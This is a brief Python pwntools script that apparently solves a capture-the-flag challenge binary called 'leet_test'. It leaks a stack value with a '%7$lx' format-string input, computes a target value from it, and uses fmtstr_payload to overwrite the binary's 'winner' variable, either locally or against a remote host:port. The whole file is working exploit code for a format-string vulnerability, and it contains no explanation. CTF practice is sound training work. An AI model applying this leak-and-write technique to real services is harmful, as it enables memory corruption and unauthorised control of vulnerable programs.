#!/usr/bin/env python3

from pwn import context, fmtstr_payload, remote, sys

context.binary = 'leet_test'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'Please enter your name: ', b'%7$lx')
    p.recvuntil(b'Hello, ')
    random = int(p.recvline().decode(), 16) >> 32

    expected = (random * 0x1337c0de) & 0xffffffff

    payload = fmtstr_payload(10, {context.binary.sym.winner: expected})
    p.sendlineafter(b'Please enter your name: ', payload)

    p.recvuntil(b'Come right in! ')
    print(p.recvline())


if __name__ == '__main__':
    main()
